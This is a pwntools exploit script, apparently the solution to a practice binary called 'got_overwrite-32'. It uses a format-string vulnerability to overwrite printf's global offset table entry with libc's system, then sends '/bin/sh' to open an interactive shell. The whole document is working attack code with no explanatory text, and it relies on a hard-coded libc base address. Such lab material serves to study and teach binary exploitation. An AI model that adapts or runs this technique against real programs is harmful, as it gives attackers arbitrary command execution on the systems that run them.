#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7c00000

p = process()

printf_got = elf.got['printf']
system = libc.sym['system']

payload = fmtstr_payload(5, { printf_got : system })

p.sendline(payload)

log.info(p.clean())

p.sendline(b'/bin/sh')

p.interactive()
